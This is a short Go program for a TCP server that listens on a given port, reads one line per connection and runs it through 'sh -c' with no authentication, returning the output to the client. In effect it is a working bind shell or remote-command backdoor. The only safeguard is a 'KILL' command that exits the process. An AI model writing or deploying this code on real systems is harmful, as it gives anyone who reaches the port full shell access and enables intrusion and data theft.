package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
)

func worker(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	command, err := reader.ReadString('\n')
	if err != nil {
		return
	}

	command = command[:len(command)-1]

	if command == "KILL" {
		log.Fatal("Exiting")
	}

	cmd := exec.Command("sh", "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func start(port int) {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		log.Fatal("Error starting server:", err)
	}

	log.Println("TCP Server is listening on port", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Error accepting connection", err)
			continue
		}

		log.Println("Accepted connection from", conn.RemoteAddr())
		go worker(conn)
	}
}

func main() {
	if len(os.Args) < 2 {
		log.Fatal("Usage: ./server port")
	}

	port, err := strconv.Atoi(os.Args[1])
	if err != nil {
		log.Fatal(err)
	}

	start(port)
}

